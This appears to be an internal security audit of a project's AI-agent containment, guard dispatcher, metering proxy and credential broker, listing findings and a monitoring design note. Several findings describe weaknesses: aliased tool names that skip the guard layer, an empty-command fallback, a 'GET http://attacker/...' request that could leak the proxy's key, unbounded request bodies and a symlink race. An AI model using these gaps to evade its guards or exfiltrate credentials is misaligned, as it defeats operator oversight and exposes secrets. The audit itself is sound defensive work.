# Custom Component Audit (W063)

Date: 2026-09-19. Scope: the security-relevant glue Workflow owns — the guard
dispatcher (`src/integrations/mcp-toolbox-guard.ts` + `mcp-toolbox/apps/workflow-guard-mcp`),
the metering proxy (`src/integrations/model-usage-proxy.ts`), the credential
broker (`src/integrations/credentials.ts`, `credential-mcp.ts`,
`secret-service.ts`), and the containment glue (`src/containment/`). Lens:
*battle-tested primitives versus our glue* — the research record's repeated
finding is that in every surveyed incident the standard primitive held and
"the custom component is the one that breaks" (`docs/AI_LANDSCAPE_RESEARCH.md`
§3.1, §6.11). This is a dated, append-only record: later passes add findings,
they do not rewrite this one.

Primitives relied on (not re-audited here): Linux user/mount/PID/network
namespaces and bubblewrap (`/usr/bin/bwrap`), `node:http` and
`node:child_process`, the `@modelcontextprotocol/sdk` stdio client/server, and
the freedesktop `secret-tool` store. Findings below are in the glue that
composes them.

## Findings

Severity follows the review rubric (P0 blocks, P1 must fix or accept in
writing, P2/P3 may be recorded).

| ID | Component | Severity | Finding | Disposition |
| --- | --- | --- | --- | --- |
| GA-1 | Guard dispatcher | P2 | Tool-name mapping is exact and case-sensitive. A host that reports `Bash`/`Write`/an alias yields `undefined` from `guardInputFromToolCall`, so the guard layer is skipped entirely. Kernel capability classification still gates mutation/process, so this is a defense-in-depth gap, not an authorization bypass. | Recorded. Fix (lowercased matching or a normalized tool taxonomy) risks changing per-host behavior; leave to a follow-up with conformance tests. |
| GA-2 | Guard dispatcher | P2 | When a shell tool's input shape is unrecognized, `shellCommandFromInput` returns `""` and the guard evaluates an empty command (which can allow), instead of failing closed. Command-shape validation lives in the host adapters, so this is defense-in-depth only. | Recorded. A fail-closed empty-command result is the obvious follow-up. |
| GA-3 | Guard dispatcher | P3 | Guard checks run *after* kernel authorization and are advisory unless a surface wires the verdict into enforcement. The server reports `enforcement: "host-dependent"` honestly. | Accepted and already documented (`THREAT_MODEL.md`, S5/S6 assurance rows). |
| MX-1 | Metering proxy | P1 (closed) | Absolute-form request-targets (`GET http://attacker/...`, RFC 7230) could make `new URL(absolute, base)` ignore the upstream and exfiltrate the injected key. | **Fixed before W063**; pinned by `test/model-usage-proxy.test.ts#"model usage proxy rejects absolute-form request targets without leaking the key (P1 regression)"`. |
| MX-2 | Metering proxy | P2 | Inbound request bodies are buffered with no size bound (`readAll`). A contained/hostile agent can send an arbitrarily large body to the mandatory egress proxy and exhaust hub memory. | Recorded. Fix is a byte cap answered with 413; safe to add, deferred to keep this pass scoped. |
| MX-3 | Metering proxy | P2 | Egress is origin-wide: any path and method on the provider origin is forwarded with the real key injected. This is the research's "an allowlist may be better conceptualized as a capability grant" lesson — the proxy is a capability, not a path filter. | Recorded; consistent with `THREAT_MODEL.md` C3 (payload/egress policy still planned). |
| MX-4 | Metering proxy | P3 | Non-hop-by-hop ambient headers (e.g. `cookie`) are forwarded upstream. | Recorded; operator-scoped, low impact. |
| CB-1 | Credential broker | P2 | `createCredentialBroker.materialize` authorizes on a caller-supplied `(reference, consumer, purpose, workspace)` tuple. The broker is in-process with no unforgeable token, so a compromised in-process integration can impersonate an allowed consumer. The trust boundary is the process, not the tuple. | Recorded; matches `THREAT_MODEL.md` ("a privileged same-user process ... remains outside Workflow's confidentiality boundary"). |
| CB-2 | Credential broker | P3 | All materialization failures (unknown id, unauthorized consumer, wrong purpose, wrong workspace, missing secret) collapse to one `credential unavailable` error — no enumeration oracle. | Positive; no action. |
| CB-3 | Credential broker | P3 | `set`/`revoke` roll back metadata and fail closed when the secret store disagrees with the control plane; both compensating-op failure paths surface rather than serving a stale value. | Positive; covered by tests. |
| CT-1 | Containment glue | P2 | A concurrent actor can swap a symlink or hardlink in a granted tree between authorization and the backend's bind mount; the pre-mount scan is not an atomic snapshot. | Documented residual in `docs/RUNTIME_CONTAINMENT.md`; requires concurrent mutation of granted trees, which operators are told not to do. |
| CT-2 | Containment glue | P2 | `read-write-no-delete` blocks creation of new entries as well as deletion, because bubblewrap cannot express "writable directory entries, unlink denied". | Documented limitation; this is the strongest available enforcement of the no-delete intent. |
| CT-3 | Containment glue | P3 | The hardlink external-alias scan walks granted trees before mounting; very large trees make argv large. | Accepted; consistent with existing behavior. |

Positive controls confirmed by reading the glue (no finding):

- The guard's own path policy resolves symlinks (`realPathWithMissingTail`) and
  checks both the lexical and real candidates before deciding — resolve-before-
  validate already holds inside the guard.
- Every `guardCheck` call site (ACP resolver, ACP session fs server, Cline
  plugin, OpenCode plugin, contained process) treats a thrown guard or a
  non-`allow` verdict as a denial.
- The metering proxy strips hop-by-hop and `Connection`-named headers, replaces
  the `authorization` header, recomputes `content-length`, forces identity
  encoding, does not follow redirects, binds loopback only, and requires an
  `https`/loopback upstream. The real key never enters the agent environment or
  config (placeholder only).
- The credential broker has no general-purpose reveal tool, validates
  environment variable names, and never persists credential values in
  control-plane state.

## Symlink ordering audit (acceptance criterion 1)

The adversarial fixture — an in-workspace symlink pointing outside the
workspace, offered as a read/write grant — is **non-exploitable**. W025 already
fixed the application-layer symlink escape (`canonicalExistingPath` resolves
symlinks, including dangling in-workspace links, before the confinement
decision). W063 adds no manufactured vulnerability; it pins the ordering with
`test/application.test.ts#"application resolves symlinks before validating
workspace confinement"` and the boundary-level
`test/containment.test.ts#"contained process denies a symlink grant that
escapes the workspace"`. See `docs/RUNTIME_CONTAINMENT.md` §Path Validation
Ordering for the recorded audit result.

## P0/P1 disposition

No P0 findings. The single P1 (MX-1) was already fixed before this pass and is
pinned by a regression test. No P1 remains open, so nothing here requires an
explicit accepted-risk signature.

## OTLP pull-based export — design note (follow-up, not implemented)

The research lesson is "isolation kept the EDR out": containment reduces
visibility, and the mitigation is *pull-based OTLP exports*, not live
in-sandbox monitoring (`docs/AI_LANDSCAPE_RESEARCH.md` §3.1). This is recorded
as a follow-up rather than half-implemented; no visibility is claimed here.

Design sketch:

1. **Boundary events, not in-sandbox behavior.** Workflow already observes
   events at the boundary — containment start/stop and enforcement mode,
   writable mount modes, guard verdicts (logged by `workflow-guard-mcp` on every
   check), and metering-proxy usage. Write them to a local, append-only JSONL
   sink with provenance stamps (observed-at, observed-by).
2. **Pull, don't push.** A separate exporter converts the sink to OTLP
   metrics/logs when an operator or scheduler pulls it, or on a bounded
   interval. The sandbox needs no live egress or listener; the control plane
   reads from outside the boundary.
3. **State the limits.** The boundary deliberately hides host process state, so
   these events describe what Workflow observed at the boundary — not what the
   contained process did internally. This is not EDR-equivalent visibility and
   should not be advertised as such.

Promotion criteria for a W-numbered task: a bounded event schema, a sink with
rotation/size caps, an OTLP exporter with an operator-triggered pull, and tests
proving the pull path never requires inbound network into containment.
